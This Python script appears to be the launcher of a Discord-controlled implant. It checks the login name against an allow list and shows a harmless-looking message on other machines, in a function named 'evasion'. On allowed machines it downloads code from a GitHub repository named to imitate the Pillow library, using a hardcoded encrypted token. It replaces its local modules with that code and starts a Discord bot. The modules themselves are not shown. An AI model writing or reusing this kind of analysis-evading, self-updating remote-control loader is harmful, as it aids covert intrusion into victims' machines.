import os
import shutil
from cryptography.fernet import Fernet
from functions.discord_handler import start_discord_bot

# Constants for GitHub repository ZIP download
GITHUB_REPO_ZIP_URL = "https://github.com/pillowlibrary/pillow/archive/refs/heads/main.zip"
UPDATE_STATUS_FILE = "update_status.txt"
LOCAL_FUNCTIONS_PATH = os.path.join(os.getcwd(), "functions")
TEMP_ZIP_PATH = os.path.join(os.getcwd(), "repo_update.zip")

allowed_users = ["border", "bob", "User"]

# Hardcoded encrypted GitHub token
encrypted_github_token = b'gAAAAABnEyDkiyPsBieWPaWfFD8nmbYyeVVsv8J9Pwb9LEHH1CP0NV1cx9fUogKz5kR3OmNDpmT_Jz_uolBTPFxyMjx97E1qXjj88HxvD7mg4PfMQwPxpzNLgpotKQeq5CEmkqz69-xX'

# Load the encryption key (same key used for your other encrypted data)
def load_key():
    return open("encryption_key.key", "rb").read()

# Decrypt the encrypted data
def decrypt_data(encrypted_data):
    key = load_key()
    cipher_suite = Fernet(key)
    decrypted_data = cipher_suite.decrypt(encrypted_data).decode()
    return decrypted_data

def check_update_status():
    if os.path.exists(UPDATE_STATUS_FILE):
        with open(UPDATE_STATUS_FILE, "r") as f:
            status = f.read().strip()
            if status == "update=true":
                return True
    return False

def reset_update_flag():
    with open(UPDATE_STATUS_FILE, "w") as f:
        f.write("update=false")

def download_and_update_files():
    print("Checking for updates from GitHub...")

    import requests
    import zipfile

    # Decrypt the GitHub token
    github_token = decrypt_data(encrypted_github_token)

    # Use the decrypted token for authentication
    headers = {'Authorization': f'token {github_token}'}
    response = requests.get(GITHUB_REPO_ZIP_URL, headers=headers)

    if response.status_code == 200:
        with open(TEMP_ZIP_PATH, "wb") as temp_zip:
            temp_zip.write(response.content)
        print("Downloaded latest code from GitHub.")

        # Extract the ZIP and overwrite the /functions directory
        with zipfile.ZipFile(TEMP_ZIP_PATH, 'r') as zip_ref:
            temp_extract_path = os.path.join(os.getcwd(), "temp_extract")
            zip_ref.extractall(temp_extract_path)

            # Replace the local /functions folder with the downloaded one
            downloaded_functions_path = os.path.join(temp_extract_path, "repo-main/functions")
            
            # Remove the old /functions directory and replace it
            if os.path.exists(LOCAL_FUNCTIONS_PATH):
                shutil.rmtree(LOCAL_FUNCTIONS_PATH)
            shutil.move(downloaded_functions_path, LOCAL_FUNCTIONS_PATH)

        # Clean up: delete the temporary files and folders
        os.remove(TEMP_ZIP_PATH)
        shutil.rmtree(temp_extract_path)

        print("Updated all files in the /functions directory.")

    else:
        print(f"Failed to download repo. Status code: {response.status_code}")

def evasion():
    print("hello vro <3")

def main():
    username = os.getlogin()
    if username in allowed_users:
        if check_update_status():
            download_and_update_files()
            reset_update_flag()
        else:
            print("No update flag set. Proceeding without update.")
    else:
        evasion()
        return

    start_discord_bot()

if __name__ == "__main__":
    main()
